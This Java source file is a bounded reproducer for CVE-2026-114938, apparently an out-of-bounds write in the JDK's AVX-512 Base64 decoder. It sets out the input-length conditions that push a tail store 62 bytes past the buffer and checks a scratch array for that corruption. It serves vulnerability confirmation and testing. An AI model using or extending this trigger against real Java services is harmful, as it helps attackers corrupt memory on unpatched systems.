import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;

/**
 * Trigger bounded para CVE-2026-114938.
 *
 * Primitiva: Quang Luong / Calif.io (advisory publico).
 * Harness e derivacao do comprimento: eduxcode (github.com/eduxcode).
 *
 * O gatilho precisa de DUAS condicoes:
 *   - length > 128, senao o stub cai no loop escalar (gate `cmpl(length,128)`);
 *   - (length % 64) em {1,2,3}, para sobrar uma cauda de 1..3 bytes com '='.
 * Com 129 bytes (128 'A' + '='): dois blocos de 64, cauda de 1 byte, e a
 * store de 64 bytes cai em dp=96 de um buffer de 98 -> 62 bytes alem.
 *
 * 64+'=' e 128+'=' NAO disparam: ficam no caminho escalar. Use um processo
 * por comprimento (a primeira excecao desotimiza decode0).
 *
 * Uso: java Base64Trigger [quantidadeDeA]
 */
public final class Base64Trigger {

    private static final int WARMUP = 5_000;
    private static final int SCRATCH_SIZE = 8192;
    private static volatile long sink;

    public static void main(String[] args) {
        int chars = args.length > 0 ? Integer.parseInt(args[0]) : 128;
        Base64.Decoder dec = Base64.getDecoder();

        // 192 > 128: aquece o caminho AVX-512 de verdade
        byte[] valid = "A".repeat(192).getBytes(StandardCharsets.US_ASCII);
        byte[] scratch = new byte[SCRATCH_SIZE];
        long acc = 0;
        for (int i = 0; i < WARMUP; i++) acc += dec.decode(valid, scratch);
        sink = acc;

        System.out.println("runtime=" + System.getProperty("java.runtime.version"));
        System.out.println("vm=" + System.getProperty("java.vm.name"));
        boolean ok = attempt(dec, chars);
        System.out.println(ok ? "REPRODUCED" : "NOT REPRODUCED");
        System.exit(ok ? 0 : 1);
    }

    private static boolean attempt(Base64.Decoder dec, int chars) {
        int inLen = chars + 1;                                   // + '='
        int paddings = 1;
        int bufferLen = 3 * ((inLen + 3) / 4) - paddings;        // alocacao da JDK
        int dp = 48 * (inLen / 64);                              // store da cauda
        int lastExpected = dp + 63;
        int oob = lastExpected - (bufferLen - 1);

        byte[] target = new byte[SCRATCH_SIZE];
        Arrays.fill(target, (byte) 0x5a);

        boolean rejected = false;
        try {
            dec.decode(("A".repeat(chars) + "=").getBytes(StandardCharsets.US_ASCII), target);
        } catch (IllegalArgumentException expected) {
            rejected = true;                                      // rejeita depois de escrever
        }

        int changed = 0, first = -1, last = -1;
        for (int i = 0; i < target.length; i++) {
            if (target[i] != (byte) 0x5a) {
                changed++;
                if (first < 0) first = i;
                last = i;
            }
        }

        boolean tail = inLen > 128 && (inLen & 63) >= 1 && (inLen & 63) <= 3;
        boolean ok = rejected && tail && changed == lastExpected + 1
                && first == 0 && last == lastExpected && oob == 62;

        System.out.printf(
            "trigger=%dx'A'+'=' inLen=%d buffer=%d dp=%d rejeitado=%s alterados=%d janela=[%d,%d] OOB=%d -> %s%n",
            chars, inLen, bufferLen, dp, rejected, changed, first, last, oob,
            ok ? "HIT" : "sem corrupcao");
        return ok;
    }
}
